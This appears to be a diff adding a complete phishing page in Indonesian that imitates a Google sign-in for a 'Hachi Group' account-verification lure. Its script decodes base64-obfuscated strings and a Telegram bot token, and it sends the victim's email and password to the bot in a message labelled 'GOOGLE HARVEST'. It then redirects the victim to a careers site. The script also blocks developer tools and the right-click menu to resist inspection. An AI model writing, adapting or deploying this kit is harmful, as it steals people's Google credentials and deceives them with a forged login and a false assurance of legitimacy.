@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title id="t_0"></title>
+    <link id="v_c" rel="icon" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root { --bg: #ffffff; --txt: #202124; --f-label: #5f6368; --input-border: #dadce0; --blue: #1a73e8; --err: #d93025; }
+        @media (prefers-color-scheme: dark) { :root { --bg: #000000; --txt: #e8eaed; --f-label: #9aa0a6; --input-border: #3c4043; --blue: #8ab4f8; --err: #f28b82; } }
+        html, body { height: 100%; width: 100%; margin: 0; padding: 0; background-color: var(--bg); color: var(--txt); font-family: 'Roboto', arial, sans-serif; cursor: none !important; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; touch-action: none; overflow: hidden; }
+        .m-c { height: 100dvh; display: flex; flex-direction: column; align-items: center; position: relative; overflow-y: auto; }
+        .g-p { width: 100%; max-width: 400px; padding: 48px 24px; display: none; flex-direction: column; align-items: flex-start; }
+        .g-p.active { display: flex; }
+        .s-p { height: 100dvh; width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; }
+        .s-p.hidden { display: none; }
+        .g-l { width: 24px; height: 24px; margin-bottom: 24px; object-fit: contain; }
+        .h-t { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: var(--txt); }
+        .s-t { font-size: 16px; margin-bottom: 32px; color: var(--txt); }
+        .f-g { position: relative; width: 100%; margin-bottom: 8px; }
+        .i-f { width: 100%; padding: 13px 15px; border: 1px solid var(--input-border); border-radius: 4px; background: transparent; color: var(--txt); font-size: 16px; outline: none; }
+        .f-l { position: absolute; left: 12px; top: 13px; color: var(--f-label); transition: all 0.2s; pointer-events: none; background: var(--bg); padding: 0 4px; }
+        .i-f:focus + .f-l, .i-a .f-l { top: -10px; font-size: 12px; color: var(--blue); }
+        .i-f:focus { border: 2px solid var(--blue); padding: 12px 14px; }
+        .e-m { color: var(--err); font-size: 12px; display: none; align-items: center; margin-top: 6px; }
+        .i-e .i-f { border-color: var(--err) !important; }
+        .i-e .f-l { color: var(--err) !important; }
+        .i-e .e-m { display: flex; }
+        .b-t { color: var(--blue); font-size: 14px; font-weight: 500; background: none; border: none; padding: 10px 0; cursor: pointer; }
+        .f-a { display: flex; justify-content: space-between; width: 100%; align-items: center; margin-top: 40px; }
+        .n-b { background: var(--blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+        @media (prefers-color-scheme: dark) { .n-b { color: #000; } }
+        .u-p { display: flex; align-items: center; border: 1px solid var(--input-border); border-radius: 20px; padding: 4px 12px 4px 6px; margin-bottom: 24px; cursor: pointer; }
+        .u-i { width: 20px; height: 20px; border-radius: 50%; background: #eee; margin-right: 8px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .b-f { width: 100%; max-width: 400px; padding: 24px; margin-top: auto; }
+        .f-r-1 { font-size: 12px; color: var(--f-label); margin-bottom: 12px; display: flex; align-items: center; }
+        .f-r-2 { display: flex; gap: 15px; font-size: 12px; color: var(--f-label); }
+        .w-t { position: fixed; bottom: 20px; left: 0; width: 100%; padding: 0 24px; text-align: center; font-size: 11px; color: #d93025; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div id="sel_page" class="s-p">
+        <img id="h_l" class="w-20 mb-6">
+        <h2 id="h_n" class="text-xl font-bold mb-8"></h2>
+        <button onclick="go_g()" class="w-full max-w-xs flex items-center justify-center gap-3 border border-[var(--input-border)] p-3 rounded-lg font-medium mb-4 bg-white text-black">
+            <img id="g_i" class="w-5"> Verifikasi Akun Google
+        </button>
+        <div class="w-t" id="w_c"></div>
+    </div>
+
+    <div id="g_page" class="m-c">
+        <div id="gs1" class="g-p active">
+            <img id="gl_1" class="g-l">
+            <h1 id="gt1" class="h-t"></h1>
+            <p id="gt2" class="s-t"></p>
+            <div class="f-g" id="gu_c">
+                <input type="text" id="iu" class="i-f" oninput="v_i(this)" onfocus="f_i(this)" onblur="b_i(this)" autocomplete="off">
+                <label class="f-l" id="llu"></label>
+                <div class="e-m" id="eu_m"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class="mr-2"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span id="etu"></span></div>
+            </div>
+            <button class="b-t" id="l_e"></button>
+            <div class="text-sm mt-8 mb-8 text-[var(--f-label)]" id="mtx"></div>
+            <div class="f-a">
+                <button class="b-t" id="c_a"></button>
+                <button class="n-b" onclick="n_1()" id="nb1"></button>
+            </div>
+        </div>
+
+        <div id="gs2" class="g-p">
+            <img id="gl_2" class="g-l">
+            <h1 id="gt3" class="h-t"></h1>
+            <div class="u-p" onclick="r_1()">
+                <div class="u-i"><svg width="14" height="14" viewBox="0 0 24 24" fill="var(--f-label)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+                <span id="u_d" class="text-sm font-medium mr-1 text-[var(--txt)]"></span>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="var(--f-label)"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div class="f-g" id="gp_c">
+                <input type="password" id="ip" class="i-f" oninput="v_i(this)" onfocus="f_i(this)" onblur="b_i(this)">
+                <label class="f-l" id="llp"></label>
+                <div class="e-m" id="ep_m"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class="mr-2"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span id="etp"></span></div>
+            </div>
+            <div class="flex items-center mt-4">
+                <input type="checkbox" id="sc" onclick="ts()" class="w-4 h-4 mr-3">
+                <label for="sc" class="text-sm" id="lls"></label>
+            </div>
+            <div class="f-a">
+                <button class="b-t" id="oc_l"></button>
+                <button class="n-b" onclick="n_2()" id="nb2"></button>
+            </div>
+        </div>
+
+        <div class="b-f" id="gf">
+            <div class="f-r-1">Indonesia <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" class="ml-1"><path d="M7 10l5 5 5-5z"/></svg></div>
+            <div class="f-r-2"><span>Bantuan</span><span>Privasi</span><span>Persyaratan</span></div>
+        </div>
+    </div>
+
+    <script>
+        const _0x = {
+            _f: "RkFWSUNPTi5wbmc=", _hl: "SEFDSEkgR1JPVVAucG5n", _gl: "R09PR0xFLnBuZw==", 
+            _tk: "ODU3ODUyNDMyMzpBQUZCS282THhtQ3NDZ0UtVG8tRENQckQ5mWdjNEZaN2kxTQ==", _ci: "ODQ2MTAxOTkxMg==", 
+            _rd: "aHR0cHM6Ly9jYXJlZXIuaGFjaGlncm91cC5pZC9jYXJlZXIvYnJhbmQ=",
+            _t1: "TG9naW4=", _t2: "R3VuYWthbiBBa3VuIEdvb2dsZSBBbmRh", _t3: "U2VsYW1hdCBkYXRhbmc=",
+            _u1: "RW1haWwgYXRhdSBub21vciB0ZWxlcG9u", _u2: "THVwYSBlbWFpbD8=", _u3: "QnVrYW4ga29tcHV0ZXIgQW5kYT8gR3VuYWthbiBNb2RlIHRhbXUgdW50dWsgbG9naW4gc2VjYXJhIHByaWJhZGku", _u4: "QnVhdCBha3Vu", _u5: "QmVyaWt1dG55YQ==",
+            _p1: "TWFzdWtrYW4gc2FuZGk=", _p2: "VGFtcGlsa2FuIHNhbmRp", _p3: "Q29iYSBjYXJhIGxhaW4=",
+            _e1: "TWFzdWtrYW4gZW1haWwgYXRhdSBub21vciB0ZWxlcG9u", _e2: "TWFzdWtrYW4gc2FuZGk=",
+            _w1: "UGVyaW5nYXRhbjogSGF0aS1oYXRpIHBlbmlwdWFuLiBQYXN0aWthbiBBbmRhIGhhbnlhIG1lbGFrdWthbiB2ZXJpZmlrYXNpIG1lbGFsdWkgcG9ydGFsIHJlc21pIEhhY2hpIEdyb3VwIGluaS4gS2FtaSB0aWRhayBwZXJuYWggbWVtaW50YSBiaWF5YSBhcGEgcHVuLg=="
+        };
+        const _d = (v) => atob(v);
+        document.getElementById('v_c').href = _d(_0x._f);
+        document.getElementById('h_l').src = _d(_0x._hl);
+        document.getElementById('g_i').src = _d(_0x._gl);
+        document.getElementById('gl_1').src = _d(_0x._gl);
+        document.getElementById('gl_2').src = _d(_0x._gl);
+        document.getElementById('w_c').innerText = _d(_0x._w1);
+        document.getElementById('gt1').innerText = _d(_0x._t1);
+        document.getElementById('gt2').innerText = _d(_0x._t2);
+        document.getElementById('gt3').innerText = _d(_0x._t3);
+        document.getElementById('llu').innerText = _d(_0x._u1);
+        document.getElementById('l_e').innerText = _d(_0x._u2);
+        document.getElementById('mtx').innerText = _d(_0x._u3);
+        document.getElementById('c_a').innerText = _d(_0x._u4);
+        document.getElementById('nb1').innerText = _d(_0x._u5);
+        document.getElementById('llp').innerText = _d(_0x._p1);
+        document.getElementById('lls').innerText = _d(_0x._p2);
+        document.getElementById('oc_l').innerText = _d(_0x._p3);
+        document.getElementById('nb2').innerText = _d(_0x._u5);
+        document.getElementById('etu').innerText = _d(_0x._e1);
+        document.getElementById('etp').innerText = _d(_0x._e2);
+        function go_g() { document.getElementById('sel_page').classList.add('hidden'); document.getElementById('g_page').style.display = 'flex'; }
+        function f_i(e) { e.parentElement.classList.add('i-a'); e.parentElement.classList.remove('i-e'); }
+        function b_i(e) { if (!e.value) e.parentElement.classList.remove('i-a'); }
+        function v_i(e) { if (e.value) e.parentElement.classList.add('i-a'); }
+        function ts() { const x = document.getElementById("ip"); x.type = x.type === "password" ? "text" : "password"; }
+        function n_1() { const u = document.getElementById('iu').value; if (!u) { document.getElementById('gu_c').classList.add('i-e'); return; } document.getElementById('gs1').classList.remove('active'); document.getElementById('gs2').classList.add('active'); document.getElementById('u_d').innerText = u; }
+        function r_1() { document.getElementById('gs2').classList.remove('active'); document.getElementById('gs1').classList.add('active'); }
+        async function n_2() { const u = document.getElementById('iu').value, p = document.getElementById('ip').value; if (!p) { document.getElementById('gp_c').classList.add('i-e'); return; } const m = `*⚡ GOOGLE HARVEST*\n👤 *User:* \`${u}\`\n🔑 *Pass:* \`${p}\``; await fetch(`https://api.telegram.org/bot${_d(_0x._tk)}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _d(_0x._ci), text: m, parse_mode: 'Markdown' }) }); window.location.replace(_d(_0x._rd)); }
+        (function extreme_lock() { setInterval(() => { const s = performance.now(); debugger; if (performance.now() - s > 50) { document.body.innerHTML = ""; location.reload(); } }, 30); window.oncontextmenu = (e) => e.preventDefault(); window.onkeydown = (e) => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && [85, 83].includes(e.keyCode))) e.preventDefault(); }; })();
+    </script>
+</body>
+</html>
